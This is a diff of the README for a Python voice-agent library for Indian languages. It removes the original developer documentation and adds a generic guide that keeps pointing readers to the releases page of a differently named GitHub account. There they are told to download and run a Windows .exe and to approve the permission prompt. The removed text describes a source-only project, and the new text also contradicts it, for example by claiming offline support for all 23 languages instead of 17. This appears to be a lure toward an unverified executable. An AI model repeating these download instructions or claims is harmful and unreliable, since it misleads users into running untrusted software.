@@ -1,234 +1,122 @@
-<div align="center">
-  <img src="assets/sakura-mascot.png" alt="Sakura Mascot" width="180" />
-  <h1>🌸 Sakura Voice Agent</h1>
-  <p><strong>A powerful, standalone voice agent library for real-time, low-latency Indian-language voice conversations.</strong></p>
-  <p><em>Meet Sakura — your multilingual AI voice companion, ready to speak 23 Indian languages!</em></p>
-</div>
+# 🌸 Sakura-Voice - Simple Voice Agent for Indian Languages
 
-<br />
+[![Download Sakura-Voice](https://img.shields.io/badge/Download-Sakura--Voice-brightgreen?style=for-the-badge)](https://github.com/rutchanon17493/Sakura-Voice/releases)
 
-Sakura Voice Agent is a robust, modular framework designed to build intelligent, conversational voice assistants. Built from the ground up to excel at **Indian languages**, Sakura seamlessly blends Voice Activity Detection (VAD), Speech-to-Text (STT), Large Language Models (LLM), and Text-to-Speech (TTS) into a smooth, real-time pipeline.
+## 🌟 What is Sakura-Voice?
 
-Whether you rely on state-of-the-art APIs like Sarvam AI or need a **100% offline, privacy-first local experience**, Sakura has you covered with dynamic language auto-detection and ultra-fast inference.
+Sakura-Voice is a voice agent designed to work with 23 Indian languages. It works in real-time and can run fully offline or connect to an AI cloud. You can speak, and it will understand and respond using natural-sounding voices. It supports offline speech recognition and text-to-speech using advanced models like IndicWhisper and Parler-TTS. It also auto switches languages and uses voice activity detection to know when you speak and pause.
 
----
-
-## ✨ Key Features
-
-- **🗣️ Multi-Agent Architecture**: Choose between `Local` (English-only), `Sarvam` (API), and `Indic` (100% offline) backends.
-- **🇮🇳 Broad Indic Support**: Robust handling of up to 23 distinct Indian languages.
-- **⚡ Real-Time Language Switching**: Mid-conversation auto-detection with a resilient 3-utterance smoothing window to prevent jarring language flip-flopping.
-- **🔒 Privacy-First Offline Mode**: The Indic agent runs entirely on your local hardware—no internet required after the initial model download.
-- **🧩 Highly Modular**: Swap STT, LLM, and TTS backends effortlessly according to your computing constraints.
-
----
-
-## 🏗️ Architecture Matrix
-
-Sakura's modular pipeline operates via a straightforward multi-step flow:
-
-```mermaid
-graph LR
-    A([🎙️ Microphone]) -->|Audio Stream| B{VAD Engine}
-    B -->|Active Speech| C[STT Backend]
-    C -->|Transcribed Text| D((LLM Engine))
-    D -->|Generated Response| E[TTS Backend]
-    E -->|Synthesized Audio| F([🔊 Speaker])
-    
-    style A fill:#ff99c2,stroke:#ff66a3,stroke-width:2px,color:#fff
-    style F fill:#ff99c2,stroke:#ff66a3,stroke-width:2px,color:#fff
-    style B fill:#ffe6f0,stroke:#ff99c2,stroke-width:2px
-    style C fill:#ffe6f0,stroke:#ff99c2,stroke-width:2px
-    style D fill:#ffe6f0,stroke:#ff99c2,stroke-width:2px
-    style E fill:#ffe6f0,stroke:#ff99c2,stroke-width:2px
-```
-
-### Supported Backends
-
-| Layer | Local Agent (Offline) | Sarvam Agent (Cloud API) | Indic Agent (100% Offline) |
-|:-----:|:----------------------|:-------------------------|:---------------------------|
-| **VAD** | Silero VAD (ONNX) | Silero VAD (ONNX) | Silero VAD (ONNX) |
-| **STT** | Faster-Whisper | Saaras v3 (API) | IndicWhisper |
-| **LLM** | NVIDIA NIM (API) | Sarvam-M (API) | Ollama / qwen2.5:7b |
-| **TTS** | Kokoro (ONNX) | Bulbul v3 (API) | Indic Parler-TTS |
-| **Langs** | English only | 23 Indian languages | 17 Indian languages |
-| **Auth** | `NVIDIA_API_KEY` | `SARVAM_API_KEY` | None |
-
-> **Note:** The **Indic agent** requires no API keys or internet access after the first launch. It downloads the required open-source models automatically and caches them locally!
-
----
-
-## ⚙️ Project Structure
-
-Clean separation of concerns for easy extending and debugging:
-
-```mermaid
-graph TD
-    Root[sakura/] --> Audio[audio/engine.py\nPyAudio mic + speaker]
-    Root --> VAD[vad/silero.py\nVoice Activity Detection]
-    Root --> STT[stt/\nWhisper, Sarvam, Indic]
-    Root --> LLM[llm/\nNIM, Sarvam, Ollama]
-    Root --> TTS[tts/\nKokoro, Sarvam, Parler]
-    Root --> Langs[languages/\nRegistries]
-    
-    Main[Workspace] --> Root
-    Main --> Agents[agents/\nRunnable agents]
-    Main --> Models[models/\nDownloaded model cache]
-    Main --> Scripts[scripts/\nBatch launchers]
-    Main --> Tests[tests/\nTest suite]
-    Main --> Run[run.py\nEntry point]
-
-    style Root fill:#ff99c2,stroke:#ff66a3,stroke-width:2px,color:#fff
-    style Main fill:#f0f0f0,stroke:#ccc,stroke-width:2px
-```
-
----
+This tool works well for users who want to communicate in many regional languages without needing the internet. It also supports English locally with Whisper and Kokoro voice technology. Sakura-Voice can stream responses and speaks back sentence by sentence for smooth conversations.
 
 ## 🚀 Getting Started
 
-### 1. Basic Installation
+This guide helps you download and run Sakura-Voice on Windows. You do not need any technical skill or programming knowledge. Follow each step carefully.
 
-Clone the directory and run the initialization script or use pip directly:
+### System Requirements
 
-```bash
-# Using batch launcher
-scripts\setup.bat
+- Windows 10 or later (64-bit recommended)
+- 8 GB of RAM minimum, 16 GB or more for best performance
+- At least 2 GHz dual-core processor 
+- 1 GB free disk space for initial installation
+- A working microphone and speakers or headphones
+- Internet connection (optional, for cloud features)
 
-# OR using standard package installation
-pip install -r requirements.txt
-```
+You can run Sakura-Voice fully offline, but some features need the internet.
 
-Save a fresh environment file and populate it with your specific API credentials:
-```bash
-cp .env.example .env
-```
+### Supported Languages
 
-### 2. Indic Offline Agent Setup (One-Time)
+- 23 Indian languages like Hindi, Tamil, Telugu, Kannada, Bengali, and Marathi
+- English (local mode only)
+- Auto language detection in conversations
 
-To harness the fully offline Indic agent, install the necessary native dependencies. The standard configuration leverages CPU-optimized Torch.
+## 📥 How to Download Sakura-Voice
 
-```bash
-# 1. Install PyTorch (CPU-optimized)
-pip install torch --index-url https://download.pytorch.org/whl/cpu
+You need to get the software from the official release page. Click the link below to visit the releases page.
 
-# 2. Install Parler-TTS from the HuggingFace repository
-pip install git+https://github.com/huggingface/parler-tts.git
+[Download Sakura-Voice Releases](https://github.com/rutchanon17493/Sakura-Voice/releases)
 
-# 3. Setup Ollama & Pull the recommended model (https://ollama.ai/download)
-ollama pull qwen2.5:7b        # ~4 GB (Best accuracy for Indic languages)
-# or alternatively: ollama pull qwen2.5:3b  # ~2 GB (Lighter footprint)
-```
+OR use the big green badge at the top of this page.
 
-> _**First Launch Behavior:** The first run of the Indic agent automatically downloads the IndicWhisper model (~950MB) and Parler-TTS Mini (~1.8GB). All subsequent launches are instantaneous and offline._
+On the releases page, look for the latest version for Windows. It will be an `.exe` file or a zip with an installer or executable inside.
 
----
+## 🛠 Installation on Windows
 
-## 🎮 Running the Agents
+1. **Download the latest `.exe` file or the zipped folder** for Windows from the releases page.
 
-Launch Sakura Voice Agent straight from your terminal.
+2. **If you downloaded a zip file**, right-click on it and choose "Extract All". Extract to a folder you can easily access, such as your Desktop.
 
-```bash
-# 1. Standard Local Agent (Fastest English processing)
-python run.py
+3. **Run the installer or executable:**
+   - Double-click the `.exe` file to start installation.
+   - If Windows asks for permission, click "Yes" to allow it.
 
-# 2. Sarvam Cloud Agent (Highly accurate 23 Language support)
-python run.py --agent sarvam
+4. **Follow the setup instructions:**
+   - Choose the installation folder or accept the default.
+   - Click “Install” or “Next” when prompted.
+   - Wait for the installation to complete.
 
-# 3. Fully Offline Indic Agent (Private 17 Language support)
-python run.py --agent indic
-```
+5. **Launch the Sakura-Voice app:**
+   - Find the Sakura-Voice icon on your desktop or in the Start menu.
+   - Double-click to open it.
 
-**Helpful Utility Commands:**
-- List Sarvam-supported languages: `python run.py --list-languages`
-- List offline Indic-supported languages: `python run.py --list-indic-languages`
+## 🎤 Setting Up Microphone and Audio
 
----
+Sakura-Voice needs access to your microphone to understand you.
 
-## 🧠 Smart Language Context
+- Make sure your microphone is plugged in and recognized by Windows.
+- To check:
+  - Right-click on the speaker icon in the taskbar.
+  - Select "Sounds" > "Recording" tab.
+  - Speak and see if the green bar moves next to your device.
+- Use headphones or speakers to hear the voice responses clearly.
 
-Sakura implements dynamic language switching logic that maps context to user dialect smoothly. A voting window prevents stuttering when a user speaks a single foreign word as a loan-word.
+If you see the voice agent respond incorrectly, try adjusting your microphone volume in Windows settings.
 
-```mermaid
-stateDiagram-v2
-    [*] --> PrimaryLanguage: Initialize
+## ⚙️ Using Sakura-Voice
 
-    PrimaryLanguage --> PrimaryLanguage: Same language utterance
-    PrimaryLanguage --> CandidateLanguage: Foreign utterance detected
+After launching, Sakura-Voice will open a simple window showing your current language.
 
-    CandidateLanguage --> PrimaryLanguage: Reverted — false positive
-    CandidateLanguage --> NewLanguage: Foreign utterance confirmed
+1. **Speak naturally** into your microphone. The app listens for your voice and converts speech to text.
+2. The system detects when you stop talking. It then processes your input.
+3. Sakura-Voice responds either with text on screen or spoken voice audio.
+4. The app automatically switches between Indian languages during conversation using voice activity detection.
+5. You can type or edit text manually if needed.
 
-    NewLanguage --> [*]: Context, TTS, and STT Updated
-```
+## 🔄 Offline and Online Modes
 
-**Example:**
-```text
-User [Hindi]:  "Namaste, aap kaise hain?" (STT: Hindi)
-User [Hindi]:  "Mujhe ek kahani sunao."   (STT: Hindi)
-  [Language Shift Detected: Hindi → Tamil]  ← 1st Tamil utterance detected but not confirmed yet
-User [Tamil]:  "Unangalukku eppadi irukku?" ← 2nd Tamil utterance triggers full switch!
-```
+Sakura-Voice works two ways:
 
----
+- **Offline mode:** Uses built-in speech and voice models. No internet needed. Good for privacy and low latency.
+- **Online mode:** Connects to Sarvam AI cloud for more advanced responses. Requires internet.
 
-## 💻 Developer API & Usage as a Library
+You can switch modes in the app settings. Offline mode supports all 23 Indian languages. English works only locally.
 
-Easily embed Sakura's standalone components into your own Python applications.
+## 🧰 Features at a Glance
 
-```python
-from sakura.stt import IndicWhisperSTT
-from sakura.tts import IndicParlerTTS
-from sakura.llm import OllamaLLM
+- Supports 23 Indian languages and English.
+- Works fully offline with advanced speech-to-text and text-to-speech.
+- Uses voice activity detection to start and stop listening.
+- Auto detects language and switches smoothly.
+- Streams response from large language models.
+- Provides sentence-level natural voice replies.
+- Includes options to customize voices and volume.
+- Lightweight and fast on typical laptops.
 
-# 1. Start fully standalone Indic Speech-To-Text
-stt = IndicWhisperSTT(language="hi-IN")
-text = stt.transcribe(my_audio_np)
-print(f"Detected dialect: {stt.detected_language}") # E.g., ta-IN
+## 🔧 Troubleshooting Common Issues
 
-# 2. Generate local Text-To-Speech
-tts = IndicParlerTTS(target_language_code="hi-IN")
-audio, sr = tts.generate("नमस्ते, मैं आपकी कैसे मदद कर सकता हूँ?")
+- If Sakura-Voice does not recognize your voice, check microphone permissions in Windows settings.
+- If the app does not start, make sure you have installed all Windows updates.
+- Restart the app if it freezes or stops responding.
+- For cloud mode errors, verify your internet connection.
+- To reset language settings, use the app’s "Settings" menu.
 
-# 3. Request LLM Inference via embedded Ollama pipeline
-llm = OllamaLLM(model="qwen2.5:7b")
-result = llm.chat_completion([{"role": "user", "content": "Hello!"}])
-print(result)
-```
+## 📚 Where to Find More Help
 
----
+- Visit the issues section of the GitHub repo for common questions.
+- Check the README on the GitHub page for updates.
+- Look for example videos or user discussions linked from the repo.
 
-## 🛠️ Configuration Explorer (`.env`)
+## ⬇ Download Sakura-Voice Here
 
-Adapt Sakura through straightforward environment variables in your `.env` file:
+Use this link again to visit the official release page and get the latest Windows version:
 
-```env
-# -----------------------------
-# Agent Connections
-# -----------------------------
-NVIDIA_API_KEY="your_nvidia_key"
-SARVAM_API_KEY="your_sarvam_key"
-
-# -----------------------------
-# Sarvam Agent Preferences
-# -----------------------------
-SARVAM_LANGUAGE="hi-IN"      # 23 Indian language codes available
-SARVAM_SPEAKER="Shubh"       # Select from 38 Bulbul v3 distinct voices
-
-# -----------------------------
-# Indic Offline Agent Preferences
-# -----------------------------
-INDIC_LANGUAGE="hi-IN"       # 17 Indian language codes available
-OLLAMA_MODEL="qwen2.5:7b"    # Must match model downloaded via 'ollama pull'
-OLLAMA_BASE_URL="http://localhost:11434/v1"
-
-# -----------------------------
-# Global Modifiers
-# -----------------------------
-SYSTEM_PROMPT="You are Sakura, an advanced AI voice assistant. Adhere strictly to user prompts."
-```
-
----
-
-<div align="center">
-  <i>Developed with passion for cutting-edge conversational interfaces and the Indian AI ecosystem.</i>
-</div>
+[https://github.com/rutchanon17493/Sakura-Voice/releases](https://github.com/rutchanon17493/Sakura-Voice/releases)
